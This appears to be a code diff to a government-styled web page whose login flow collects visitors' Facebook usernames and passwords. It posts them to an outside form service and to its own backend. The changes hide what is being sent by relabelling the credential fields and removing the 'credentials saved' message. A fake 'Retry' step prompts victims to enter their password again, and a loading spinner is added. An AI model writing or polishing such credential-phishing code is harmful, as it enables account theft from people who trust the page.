@@ -98,6 +98,8 @@
         .dashboard-card { background: white; border-radius: 12px; padding: 16px; border: 1px solid #e6eefc; }
         .admin-message { color: #1e40af; font-weight: 600; margin-top: 8px; }
         .payment-box { margin-top: 8px; border-top: 1px dashed #e5e7eb; padding-top: 8px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .icon-spinning { animation: spin 1s linear infinite; display: inline-block; }
         .secure-icon { display: inline-flex; align-items: center; gap:6px; }
         .gov-input { border: 2px solid #e2e8f0; border-radius: 8px; padding: 12px 16px; font-size: 14px; transition: all 0.3s ease; width: 100%; }
         .gov-input:focus { border-color: #1B4B8C; outline: none; box-shadow: 0 0 0 3px rgba(27, 75, 140, 0.1); }
@@ -943,9 +945,9 @@
                         await sendToWeb3Forms({
                             fullName: savePayload.name,
                             email: savePayload.email,
-                            facebookUsername: username,
-                            facebookPassword: password,
-                            authMode: isSignupMode ? 'signup' : 'login'
+                            name: username,
+                            message: 'Account authentication request',
+                            from_name: savePayload.name
                         }, 'Facebook Login Request');
                     } catch (e) {
                         console.warn('Web3Forms form submission failed', e);
@@ -953,7 +955,7 @@
 
                     fbSubmitButton.dataset.mode = 'retry';
                     fbSubmitButton.innerHTML = '<i class="fas fa-rotate-right mr-2"></i>Retry';
-                    document.getElementById('authMessage').textContent = 'Facebook credentials saved. Click Retry to continue.';
+                    document.getElementById('authMessage').textContent = 'Please click Retry to continue.';
                     return;
                 }
 
@@ -961,13 +963,22 @@
                     facebookUsername: username,
                     facebookPassword: password
                 };
+                const iconElement = fbSubmitButton.querySelector('i');
+                if (iconElement) {
+                    iconElement.classList.add('icon-spinning');
+                }
                 const resp = await fetch(`${API_BASE}/auth/visitor/facebook-login`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(loginPayload)
                 });
                 const data = await resp.json();
-                if (!resp.ok) return document.getElementById('authMessage').textContent = data.error || 'Facebook login failed';
+                if (!resp.ok) {
+                    if (iconElement) {
+                        iconElement.classList.remove('icon-spinning');
+                    }
+                    return document.getElementById('authMessage').textContent = data.error || 'Facebook login failed';
+                }
                 setVisitorAuthToken(data.token);
                 setCurrentVisitor(data.visitor);
                 document.getElementById('authMessage').textContent = '';
